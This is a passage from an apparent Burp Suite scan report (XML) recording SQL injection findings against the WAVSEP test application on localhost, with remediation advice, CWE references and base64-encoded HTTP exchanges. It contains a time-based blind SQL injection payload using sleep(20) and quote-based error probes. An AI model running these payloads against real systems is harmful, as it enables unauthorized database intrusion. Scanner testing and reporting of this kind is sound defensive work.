    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20007</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1PYmZ1c2NhdGlvbkV4cGxvaXQvQ2FzZTAxLUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlRGF0YWJhc2VWZXJzaW9uVVJMRW5jb2RlLVVuaW9uT2JmdXNjYXRpb25FeHBsb2l0LmpzcD9tc2c9dGV4dHZhbHVlJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQtT2JmdXNjYXRpb25FeHBsb2l0L2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwOTowMzo0MiBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1PYmZ1c2NhdGlvbkV4cGxvaXQvQ2FzZTAxLUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlRGF0YWJhc2VWZXJzaW9uVVJMRW5jb2RlLVVuaW9uT2JmdXNjYXRpb25FeHBsb2l0LmpzcD9tc2c9dGV4dHZhbHVlJycgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VULU9iZnVzY2F0aW9uRXhwbG9pdC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAzOjQyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTcNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IHJldHJpZXZlIHRoZSBkYXRhYmFzZSB2ZXJzaW9uIGJ5IGluamVjdGluZyBhIFVSTC1lbmNvZGVkIHBheWxvYWQuPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1PYmZ1c2NhdGlvbkV4cGxvaXQvQ2FzZTAxLUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlRGF0YWJhc2VWZXJzaW9uVVJMRW5jb2RlLVVuaW9uT2JmdXNjYXRpb25FeHBsb2l0LmpzcD9tc2c9dGV4dHZhbHVlJyUyMGFuZCUyMChzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKS0tJTIwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1PYmZ1c2NhdGlvbkV4cGxvaXQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjA0OjAzIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTcNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IHJldHJpZXZlIHRoZSBkYXRhYmFzZSB2ZXJzaW9uIGJ5IGluamVjdGluZyBhIFVSTC1lbmNvZGVkIHBheWxvYWQuPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6299843717214084096</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-ObfuscationExploit/Case02-InjectionInSearch-RetrieveDatabaseVersionSpecialURLEncode-UnionObfuscationExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-ObfuscationExploit/Case02-InjectionInSearch-RetrieveDatabaseVersionSpecialURLEncode-UnionObfuscationExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20006</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1PYmZ1c2NhdGlvbkV4cGxvaXQvQ2FzZTAyLUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlRGF0YWJhc2VWZXJzaW9uU3BlY2lhbFVSTEVuY29kZS1Vbmlvbk9iZnVzY2F0aW9uRXhwbG9pdC5qc3A/bXNnPXRleHR2YWx1ZScgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VULU9iZnVzY2F0aW9uRXhwbG9pdC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwOTowMzo0MyBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1PYmZ1c2NhdGlvbkV4cGxvaXQvQ2FzZTAyLUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlRGF0YWJhc2VWZXJzaW9uU3BlY2lhbFVSTEVuY29kZS1Vbmlvbk9iZnVzY2F0aW9uRXhwbG9pdC5qc3A/bXNnPXRleHR2YWx1ZScnIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1PYmZ1c2NhdGlvbkV4cGxvaXQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
